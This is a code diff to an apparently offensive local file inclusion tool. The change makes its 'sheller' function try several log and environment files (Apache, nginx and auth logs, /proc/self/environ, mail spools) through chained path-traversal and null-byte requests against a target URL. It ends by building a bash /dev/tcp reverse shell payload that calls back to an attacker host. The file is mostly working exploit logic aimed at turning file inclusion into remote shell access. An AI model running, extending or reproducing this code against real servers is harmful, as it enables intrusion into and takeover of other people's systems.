@@ -737,15 +737,29 @@ def sheller(
     file = ""
 
     if technique == 1:
-        file = "/proc/self/environ"
+        files = [
+            "/proc/self/environ",
+        ]
     elif technique == 2:
-        file = "/var/log/apache2/access.log"
+        files = [
+            "/var/log/apache2/access.log",
+            "/var/log/apache/access.log",
+            "/etc/httpd/logs/access_log",
+            "/var/log/httpd/access_log",
+        ]
     elif technique == 3:
-        file = "/var/log/auth.log"
+        files = [
+            "/var/log/auth.log",
+            "/var/log/secure",
+        ]
     elif technique == 4:
-        file = "/var/mail/www-data"
+        files = [
+            "/var/mail/www-data",
+        ]
     elif technique == 5:
-        file = "/var/log/nginx/access.log"
+        files = [
+            "/var/log/nginx/access.log",
+        ]
     elif technique == 6:
         success = ["something here"]
 
@@ -763,38 +777,26 @@ def sheller(
         sys.stdout.write("{0} └── Looking for Log File:{1}".format(
             color.RD, color.END
         ))
-        for i in paylist:
-            d = 1
-            while d <= depth:
-                traverse = ""
-                j = 1
-                # chain traversal payloads
-                while j <= d:
-                    traverse += i
-                    j += 1
+        for candidate in files:
+            for i in paylist:
+                d = 1
+                while d <= depth:
+                    traverse = ""
+                    j = 1
+                    # chain traversal payloads
+                    while j <= d:
+                        traverse += i
+                        j += 1
 
-                # send attack requests - no nullbyte injection
-                requestlist = []
-                for prefix in wlist:
-                    combined = prefix + traverse
-                    if nullist == []:
-                        try:
-                            requestlist += attack_request(
-                                s, attack, url, url2, keyword,
-                                selected, combined, file, "", "",
-                                post_data, timeout, sheller=True,
-                            )
-                        except (
-                            requests.exceptions.Timeout,
-                            requests.exceptions.ConnectionError
-                        ):
-                            print("Timeout reached for " + url)
-                    else:
-                        for nb in nullist:
+                    # send attack requests - no nullbyte injection
+                    requestlist = []
+                    for prefix in wlist:
+                        combined = prefix + traverse
+                        if nullist == []:
                             try:
                                 requestlist += attack_request(
                                     s, attack, url, url2, keyword,
-                                    selected, combined, file, "", nb,
+                                    selected, combined, candidate, "", "",
                                     post_data, timeout, sheller=True,
                                 )
                             except (
@@ -802,40 +804,54 @@ def sheller(
                                 requests.exceptions.ConnectionError
                             ):
                                 print("Timeout reached for " + url)
-                                continue
+                        else:
+                            for nb in nullist:
+                                try:
+                                    requestlist += attack_request(
+                                        s, attack, url, url2, keyword,
+                                        selected, combined, candidate, "", nb,
+                                        post_data, timeout, sheller=True,
+                                    )
+                                except (
+                                    requests.exceptions.Timeout,
+                                    requests.exceptions.ConnectionError
+                                ):
+                                    print("Timeout reached for " + url)
+                                    continue
 
-                # analyze result
-                found = False
-                for (r, p, nb, data, traverse) in requestlist:
-                    if attack == 3:
-                        s.cookies.set(selected, p)
-                    if str(r.status_code).startswith("2"):
-                        if (
-                            filecheck(r, con2, con3, p)
-                            and attack not in [4, 5]
-                            or filecheck(r, con2, con3, p, post=True)
-                            and attack in [4, 5]
-                        ):
-                            success = (r, p, nb, data, traverse)
-                            found = True
-                            break
-                    if verbose:
-                        if attack in [1, 2]:
-                            print(color.END + "{}|: ".format(
-                                r.status_code) + r.url
+                    # analyze result
+                    found = False
+                    for (r, p, nb, data, traverse) in requestlist:
+                        if attack == 3:
+                            s.cookies.set(selected, p)
+                        if str(r.status_code).startswith("2"):
+                            if (
+                                filecheck(r, con2, con3, p)
+                                and attack not in [4, 5]
+                                or filecheck(r, con2, con3, p, post=True)
+                                and attack in [4, 5]
+                            ):
+                                success = (r, p, nb, data, traverse)
+                                found = True
+                                break
+                        if verbose:
+                            if attack in [1, 2]:
+                                print(color.END + "{}|: ".format(
+                                    r.status_code) + r.url
+                                )
+                            elif attack in [3, 4, 5]:
+                                print(color.END + "{}|: ".format(
+                                    r.status_code)+r.url + " : " + p
+                                )
+                    d += 1
+                    if found:
+                        sys.stdout.write(
+                            "{0}   ✓{2}|{1}\n".format(
+                                color.O, color.END, color.END + color.RD
                             )
-                        elif attack in [3, 4, 5]:
-                            print(color.END + "{}|: ".format(
-                                r.status_code)+r.url + " : " + p
-                            )
-                d += 1
-                if found:
-                    sys.stdout.write(
-                        "{0}   ✓{2}|{1}\n".format(
-                            color.O, color.END, color.END + color.RD
                         )
-                    )
-                    break
+                        file = candidate
+                        break
 
     if success:
         PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(
